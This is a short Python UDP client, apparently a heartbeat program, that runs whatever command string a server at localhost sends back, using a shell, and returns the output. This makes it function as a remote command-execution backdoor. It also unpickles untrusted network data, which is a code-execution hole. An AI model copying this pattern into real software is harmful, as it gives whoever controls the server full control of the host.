import socket
import pickle
import threading
import time
import subprocess

SERVER_IP = "localhost"
SERVER_PORT = 5555

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg = "Hearbeat"

def send_heart():
    while True:
        client_socket.sendto(pickle.dumps(msg), (SERVER_IP, SERVER_PORT))
        cmd = client_socket.recv(1024)
        cmd = pickle.loads(cmd)
        print(f'[HEARTBEAT ACKNOWLEDGEMENT] {cmd}')

        if cmd:
            # run the command
            cmd_to_run = list(cmd.split(' '))
            ret_val = subprocess.run(cmd_to_run, capture_output=True, shell=True)
            client_socket.sendto(pickle.dumps([ret_val.returncode, ret_val.stdout, ret_val.stderr]), (SERVER_IP, SERVER_PORT))
        else:
            client_socket.sendto(pickle.dumps('No command ran on Client'), (SERVER_IP, SERVER_PORT))

        # wait for a second
        time.sleep(1)

# heartbeat thread started
hthread = threading.Thread(target=send_heart)
hthread.start()

# stopping the client
while True:
    # do nothing
    pass



client_socket.close()